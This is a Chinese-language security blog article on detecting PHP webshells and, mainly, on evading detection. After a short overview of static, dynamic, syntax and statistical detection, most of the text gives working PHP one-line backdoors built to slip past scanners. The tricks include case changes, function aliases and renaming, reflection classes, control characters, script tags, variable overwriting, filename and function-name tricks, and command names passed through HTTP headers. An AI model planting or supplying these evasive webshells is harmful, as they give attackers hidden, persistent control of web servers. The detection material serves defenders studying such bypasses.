# PHP Webshell检测与绕过

阅读量 **1136984**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-02-01 16:00:34

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01781e6745c6b37308.png)

## 前言

一般的，利用能够执行系统命令、加载代码的函数，或者组合一些普通函数，完成一些高级间谍功能的网站后门的脚本，叫做 `Webshell`
。而php做为一门动态语言，其灵活性很高，因此一直以来 `Webshell` 的绕过与检测之间不断的产生着化学反应。

`Webshell` 绕过的本质其实是针对不同的检测给予不同的绕过方式，因此想要学会绕过，首先要了解 `Webshell` 是如何检测的。

## Webshell 检测

[webshell检测模型](https://www.cnblogs.com/he1m4n6a/p/9245155.html)

> Webshell的运行流程： `hacker -> HTTP Protocol -> Web Server -> CGI`
> 。简单来看就是这样一个顺序：黑客通过浏览器以HTTP协议访问Web
> Server上的一个CGI文件。棘手的是，webshell就是一个合法的TCP连接，在TCP/IP的应用层之下没有任何特征（当然不是绝对的），只有在应用层进行检测。黑客入侵服务器，使用webshell，不管是传文件还是改文件，必然有一个文件会包含webshell代码，很容易想到从文件代码入手，这是静态特征检测；webshell运行后，B/S数据通过HTTP交互，HTTP请求/响应中可以找到蛛丝马迹，这是动态特征检测。

`Webshell` 检测真要细说起来就超过本菜鸡的能力范围之内了，大致分为

  * 静态检测，通过匹配特征码，特征值，危险函数函数来查找 WebShell 的方法，只能查找已知的 WebShell，并且误报率漏报率会比较高，但是如果规则完善，可以减低误报率，但是漏报率必定会有所提高。
  * 动态检测，执行时刻表现出来的特征，比如数据库操作、敏感文件读取等。
  * 语法检测，根据 PHP 语言扫描编译的实现方式，进行剥离代码、注释，分析变量、函数、字符串、语言结构的分析方式，来实现关键危险函数的捕捉方式。这样可以完美解决漏报的情况。但误报上，仍存在问题。
  * 统计学检测，通过信息熵、最长单词、重合指数、压缩比等检测。

而本文着重讲的是静态特征检测，静态检测通过匹配特征码，特征值，危险函数函数来查找webshell的方法，只能查找已知的webshell，并且误报率漏报率会比较高，但是如果规则完善，可以减低误报率，但是漏报率必定会有所提高。优点是快速方便，对已知的webshell查找准确率高，容易被绕过。

###  基于webshell特征检测

常见webshell函数

  * 存在系统调用的命令执行函数，如 `eval、system、cmd_shell、assert` 等；
  * 存在系统调用的文件操作函数，如 `fopen、fwrite、readdir` 等；
  * 存在数据库操作函数，调用系统自身的存储过程来连接数据库操作；
  * 具备很深的自身隐藏性、可伪装性，可长期潜伏到web源码中；
  * 衍生变种多，可通过自定义加解密函数、利用xor、字符串反转、压缩、截断重组等方法来绕过检测；

    
    
    //利用base64编码
    <?php
    $b = base64_encode(‘whoami‘);
    echo $b.'';
    echo base64_decode($b).'';?>
    //利用gzcompress压缩
    <?php
    $c = gzcompress('whoami');
    echo $c.'<br>';
    echo gzuncompress($c)."";?>
    //进制运算    
     <?php @$_++; $__=("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/"); ?>
    //利用注释符
    <?php @${$__}[!$_](${$__}[$_]);@$_="s"."s"./*-/*-*/"e"./*-/*-*/"r";@$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";@$_/*-/*-*/($/*-/*-*/{"_P"./*-/*-*/"OS"./*-/*-*/"T"}[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);    ?>
    

`Webshell` 的实现需要两步：数据的传递、执行所传递的数据。

![](https://p1.ssl.qhimg.com/t0115623bb3e84ef7b7.png)

对于执行数据部分，我们可以收集关键词，匹配脚本文件中的关键词找出可疑函数，当执行数据部分匹配到可疑函数时再进行判断其数据传递部分是否为用户可控，譬如
`$_POST、$_GET、$_REQUEST、$_FILES、$_COOKIE、$_SERVER` 等等。

![](https://p4.ssl.qhimg.com/t01fecad85427b32f39.png)

不过一些变形的 `webshell` 通过各种编码、加密、压缩PHP文件，或者通过一些动态方法调用来绕过关键字匹配，此时我们可以通过收集
`webshell` 中会用到的而一般文件不会用到的函数和代码、收集出现过的 `webshell`
，将其中的特征码提取出来，也就是收集特征码，特征值，危险函数来完善规则库，提高查杀率。

## Webshell 绕过

###  PHP动态特性的捕捉与逃逸

在p牛的[《PHP动态特性的捕捉与逃逸》](https://github.com/knownsec/KCon/blob/master/2019/25%E6%97%A5/PHP%E5%8A%A8%E6%80%81%E7%89%B9%E6%80%A7%E7%9A%84%E6%8D%95%E6%8D%89%E4%B8%8E%E9%80%83%E9%80%B8.pdf)
中，将常见的PHP一句话木马分为如下几个类别：

![](https://p3.ssl.qhimg.com/dm/1024_269_/t017fad5ab6c46df2ad.png)

![](https://p5.ssl.qhimg.com/dm/1024_164_/t01170b4aed7b60b651.png)

其中回调型后门的检测：

  1. 遍历AST Tree
  2. 分析FuncCall Node，判断是否调用了含有”回调参数”的函数
  3. 判断回调参数是否是一个变量

介绍了如何绕过回调参数黑名单

**大小写绕过**

    
    
    <?php
    UsORt($_POST[1], $_POST[2]);
    

**函数别名**

`mbereg_replace` 、 `mbereg_ireplace` 在文档里搜索不到，实际上却是 `mb_ereg_replace` 、
`mb_eregi_replace` 的别名，而 `mb_ereg_replace` 、 `mb_eregi_replace` 的作用和
`preg_replace` 一样，支持传入e模式的正则表达式，进而执行任意代码；而且，PHP7后已经删除了 `preg_replace` 的e模式，而
`mb_ereg_replace` 的e模式仍然坚挺到现在。

    
    
    <?php
    mbereg_replace('.*', '', $_REQUEST[2333], 'mer');
    

不过， `mbereg_replace` 这个别名在PHP7.3被移除了，所以上述代码只能在7.2及以下的PHP中使用。

**函数重命名**

    
    
    <?php
    use function assert as test;
    
    test($_POST[2333]);
    

**类的继承**

    
    
    <?php
    class test extends ReflectionFunction {}
    $f = new test($_POST['name']);
    $f->invoke($_POST[2333]);
    

php7匿名类

    
    
    <?php
    $f = new class($_POST['name']) extends ReflectionFunction {};
    $f->invoke($_POST[2333]);
    

**变长参数**

    
    
    <?php
    usort(...$_GET);
    

**控制字符**

`[x00-x20]` PHP引擎会忽略这些控制字符，正确执行PHP函数；而PHP-Parser是无法正确解析的这些包含控制字符的函数的，可绕过一些具有语法解析的Webshell检测引擎：

    
    
    <?php evalx01x02($_POST[2333]);
    

**利用PHP标签识别差异**

![](https://p3.ssl.qhimg.com/t01730f06adbc81b17f.png)

而PHP-Parser只支持前两个标签，传入一个由 `<script>` 标签构造的 `Webshell` ，不识别该标签的检测引擎就会出现绕过：

    
    
    <script language="php">
      eval($_POST[2333]);
    </script>
    

上面的方法同样可以配合各种绕过方式提高绕过的可能性。

###  常规思路

**遍历PHP的文档，查找不常见且可做后门的回调函数**

利用下面五个关键词，能提高查找到拥有后门潜质的PHP回调函数的效率：

**关键词一：callable**

![](https://p3.ssl.qhimg.com/t0178d58bb721721ab4.png)

**关键词二：mixed $options**

![](https://p5.ssl.qhimg.com/t012a45b971ecc917ba.png)

**关键词三：handler**

![](https://p2.ssl.qhimg.com/t01bd12f06794606631.png)

**关键词四：callback**

![](https://p0.ssl.qhimg.com/t01f301e99b1c01f815.png)

**关键词五：invoke**

![](https://p2.ssl.qhimg.com/t015dc927ac757c7f88.png)

**substr拼接**

![](https://p4.ssl.qhimg.com/dm/1024_614_/t0171d292fb95be2b64.png)

**变量覆盖**

    
    
    <?php  $a=1;$b=$_POST;extract($b);print_r(`$a`)?>
    

![](https://p5.ssl.qhimg.com/t01b5c53d7740213c39.png)

    
    
    <?php
    $b='ls';
    parse_str("a=$b");
    print_r(`$a`);
    ?>
    

![](https://p0.ssl.qhimg.com/t0173e972caae6a7e2e.png)

**析构函数**

![](https://p3.ssl.qhimg.com/t011b3d20a4e81ccd25.png)

改成system

![](https://p0.ssl.qhimg.com/dm/1024_816_/t01cb732a34e328dbd0.png)

**‘’或者null拼接**

析构函数中eval直接报3级错误，我们加一个拼接

![](https://p0.ssl.qhimg.com/dm/1024_726_/t01fb5a240a4a39f40a.png)

###  利用文件名

一般webshell是通过文件内容来查杀，因此我们可以利用一切非文件内容的可控值来构造webshell，譬如文件名

    
    
    <?php
    substr(__FILE__, -10,-4)($_GET['a']);
    ?>
    

![](https://p0.ssl.qhimg.com/t011631b6aed9db3d0e.png)

同理，除了文件名，还有哪些我们很容易可以控制的值呢？

函数名也可。

    
    
    <?php 
    function systema(){
        substr(__FUNCTION__, -7,-1)($_GET['a']);
    }
    systema();
    

![](https://p5.ssl.qhimg.com/dm/1024_704_/t01ba3ffcb3d2152725.png)

同理方法名也可

    
    
    <?php 
    class test{
        function systema(){
            substr(__METHOD__, -7,-1)($_GET['a']);
        }
    }
    $a = new test();
    $a->systema();
    

![](https://p1.ssl.qhimg.com/dm/1024_683_/t01b6f4db91ee08e024.png)

还有类名 `__CLASS__` 什么的就不再多说了。

###  利用注释

`PHP Reflection API` 可以用于导出或者提取关于类 , 方法 , 属性 , 参数 等详细信息 . 甚至包含注释的内容。

![](https://p4.ssl.qhimg.com/t010be98332c4320140.png)

###  利用getenv+Apache + HTTP header

`getenv` 能够获取 `phpinfo` 中 `ApacheEnvironment` 和 `Environment` 中的值。

请求头中的变量会以 `HTTP_变量名` 的形式存在 `Apache Environment` 中。

因此我们在请求头中带上 `E: system` ，我们可以通过 `getenv('HTTP_E')` 来获取其值 `system`

![](https://p5.ssl.qhimg.com/dm/1024_311_/t0124ed7b865e286bb5.png)

![](https://p5.ssl.qhimg.com/t010d431032145659ef.png)

同理应该还有许多类似的获取字符串骚操作等待挖掘，上面是执行数据部分，然后是数据传递部分

除了直接使用
`$GLOBALS、$_SERVER、$_REQUEST、$_POST、$_GET、$_FILES、$_ENV、$_COOKIE、$_SESSION`
这些超全局变量外，我们还可以怎样传递数据呢？

首先看直接 `<?php eval($_POST['a']);?>` 时，级别为5

![](https://p1.ssl.qhimg.com/dm/1024_575_/t0151ce6b57b0dc6bc5.png)

直接 `<?php`$_POST[‘a’]`;?>` 级别也为5

![](https://p3.ssl.qhimg.com/t019bd06b8035f861ff.png)

###  引用传值

    
    
    <?php
    function foo(&$var)
    {
        $var = $_POST['a'];
    }
    
    $a="";
    foo($a);
    eval($a);
    ?>
    

![](https://p1.ssl.qhimg.com/t01fdc7f1ae0da5961f.png)

可以看到级别变成了1。

引用传值配合反引号

    
    
    <?php
    function foo(&$var)
    {
        $var = $_GET['a'];
    }
    
    $a="";
    foo($a);
    `$a`;
    ?>
    

![](https://p3.ssl.qhimg.com/t011a12d607eca871b1.png)

可以看到直接绕过去了。

###  间接传值

curl获取内容后 `eval` ，级别为1

![](https://p3.ssl.qhimg.com/dm/1024_805_/t01136594dc6b0f0d6b.png)

再配合上引用传值后直接绕过

![](https://p1.ssl.qhimg.com/dm/1024_895_/t01a4a1f1a131f084af.png)

![](https://p1.ssl.qhimg.com/dm/1024_498_/t01c317e75e81dc091b.png)

## Referer

[PHP动态特性的捕捉与逃逸](https://www.leavesongs.com/PENETRATION/dynamic-features-and-webshell-tricks-in-php.html)

[php-webshell-detect-bypass](https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md)

[创造tips的秘籍——PHP回调后门](https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html)

[过D盾webshell分享](https://xz.aliyun.com/t/3959)

[Webshell入侵检测初探（一）](https://www.freebuf.com/articles/web/183520.html)

[webshell检测方法归纳](https://www.cnblogs.com/he1m4n6a/p/9245155.html)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Smi1e** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/197631](/post/id/197631)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [PHP](/tag/PHP)
  * [webshell](/tag/webshell)

 **+1** __14赞

 __收藏

![](https://p5.ssl.qhimg.com/t010d9349529890bcdc.png) Smi1e

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

